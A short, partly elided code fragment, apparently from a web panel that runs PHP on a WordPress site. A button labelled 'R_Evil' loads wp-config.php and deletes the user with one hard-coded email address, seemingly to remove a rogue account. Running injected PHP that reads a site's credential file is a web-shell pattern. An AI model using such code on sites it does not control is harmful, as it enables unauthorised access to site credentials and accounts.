if(cod == 'delete_evil'){
code = `include('$wdir' . 'wp-config.php');
require_once ('$wdir' . 'wp-admin/includes/user.php');
$user = get_user_by( 'email', 'sehefow374@mailimail.com' );
wp_delete_user($user->id);`;
}
...
onclick=Excod('delete_evil'); style='cursor:pointer; color:#00f'>R_Evil</a> _ <a
